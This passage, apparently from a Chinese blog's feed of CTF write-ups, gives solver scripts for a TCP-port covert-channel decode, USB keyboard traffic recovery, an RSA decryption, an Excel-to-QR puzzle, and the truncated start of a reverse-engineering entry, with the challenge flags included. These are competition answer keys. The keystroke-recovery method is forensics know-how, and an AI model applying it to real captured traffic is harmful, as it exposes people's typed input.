class="hljs-keyword">as</span> scapy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_port_packets</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从指定的 pcapng 文件中读取 TCP 端口信息并解码。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param filename: pcapng 文件路径</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 读取 pcapng 文件中的所有包信息</span><br>    packets = scapy.rdpcap(filename)<br><br>    <span class="hljs-comment"># 提取包中的 TCP 端口号信息，存储到列表中</span><br>    ports = [packet[<span class="hljs-string">&#x27;TCP&#x27;</span>].dport <span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets]<br><br>    <span class="hljs-comment"># 去掉前 10 个端口号</span><br>    ports = ports[<span class="hljs-number">10</span>:]<br><br>    <span class="hljs-comment"># 将列表中的 TCP 端口号重新组织成若干个连续段</span><br>    port_groups = []<br>    tmp_group = []<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">200</span> != port:<br>            tmp_group.append(port)<br>        <span class="hljs-keyword">else</span>:<br>            port_groups.append(tmp_group)<br>            tmp_group = []<br>    <br>    <span class="hljs-comment"># 将每个连续段内的 TCP 端口号转换为四进制数字，并拼接为一个字符串</span><br>    four_numbers = []<br>    <span class="hljs-keyword">for</span> group <span class="hljs-keyword">in</span> port_groups:<br>        four_number = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> group:<br>            four_number += <span class="hljs-built_in">str</span>(port % <span class="hljs-number">10000</span>)<br>        four_numbers.append(four_number)<br><br>    <span class="hljs-comment"># 将每个四进制数字字符串解码为 ASCII 字符串，并打印输出</span><br>    <span class="hljs-keyword">for</span> four_number <span class="hljs-keyword">in</span> four_numbers:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(four_number, <span class="hljs-number">4</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 测试代码，读取 port.pcapng 文件并解码其中的 TCP 端口信息</span><br>decode_port_packets(<span class="hljs-string">&#x27;port.pcapng&#x27;</span>)<br><br><span class="hljs-comment">#DASCTF&#123;67011b0c-ba47-488f-9beb-283e7352e35e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2023HWS夏令营入营赛"><a href="#2023HWS夏令营入营赛" class="headerlink" title="2023HWS夏令营入营赛"></a>2023HWS夏令营入营赛</h2><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>前面是常规键盘流量分析，后面有点野路子。<br><code>tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>发现导出的数据第一列有异常，部分为<code>20</code>，常见的键盘流量分析题目，均为<code>00</code> <code>01</code> <code>02</code>等类型，遂手动将第一列的<code>20</code>改为<code>02</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023hwsummer/3.png"><br>赛博厨子直接梭<br><img src="/mdimg/2023hwsummer/4.png"><br><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p><p>咕咕咕了~</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>USB流量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第七届蓝帽杯半决赛</title>
    <link href="/2023/08/31/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2023/08/31/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>CryptoCTF2019原题</p><p><a href="https://4cad.github.io/CTF_Writeups/201908%20CryptoCTF/Clever%20Girl/CryptoCTF%202019%20-%20Clever%20Girl.html">https://4cad.github.io/CTF_Writeups/201908%20CryptoCTF/Clever%20Girl/CryptoCTF%202019%20-%20Clever%20Girl.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>p = <span class="hljs-number">12604273285023995463340817959574344558787108098986028639834181397979984443923512555395852711753996829630650627741178073792454428457548575860120924352450409</span><br>q = <span class="hljs-number">12774247264858490260286489817359549241755117653791190036750069541210299769639605520977166141575653832360695781409025914510310324035255606840902393222949771</span><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339</span><br>c = <span class="hljs-number">15380535750650959213679345560658190067564859611922563753882617419201718847747207949211621591882732604480600745000879508274349808435529637573773711729853565120321608048340424321537282281161623712479117497156437792084977778826238039385697230676340978078264209760724043776058017336241110097549146883806481148999</span><br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>g = gmpy2.gcd(e, phi)<br>e //= g<br>d = gmpy2.invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>m, _ = gmpy2.iroot(m, g)<br><br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#b&#x27;flag&#123;2a5a9c6fe94da5ef7edeffebb506b29a&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="排队队吃果果"><a href="#排队队吃果果" class="headerlink" title="排队队吃果果"></a>排队队吃果果</h3><p>手撸按大小排序，接着用脚本处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> openpyxl<br><br><span class="hljs-comment"># 打开Excel文件</span><br>file_path = <span class="hljs-string">&quot;data.xlsx&quot;</span><br>workbook = openpyxl.load_workbook(file_path)<br><br><span class="hljs-comment"># 遍历所有工作表</span><br><span class="hljs-keyword">for</span> sheet_name <span class="hljs-keyword">in</span> workbook.sheetnames:<br>    sheet = workbook[sheet_name]<br><br>    <span class="hljs-comment"># 遍历每个单元格</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows():<br>        <span class="hljs-keyword">for</span> cell <span class="hljs-keyword">in</span> row:<br>            <span class="hljs-comment"># 检查单元格是否为粗体</span><br>            <span class="hljs-keyword">if</span> cell.font.bold:<br>                cell.value = <span class="hljs-string">&quot;0&quot;</span>  <span class="hljs-comment"># 替换粗体文本为&quot;0&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                cell.value = <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># 替换细文本为&quot;1&quot;</span><br><br><span class="hljs-comment"># 保存修改后的Excel文件</span><br>workbook.save(<span class="hljs-string">&quot;modified_excel_file.xlsx&quot;</span>)<br></code></pre></td></tr></table></figure><p>将0留白，将1涂黑，得到二维码后扫码即可。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="justamat"><a href="#justamat" class="headerlink" title="justamat"></a>justamat</h3><p>先输入42个字符，然后拼成100个字符，在<code>sub_4051A0</code>处加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 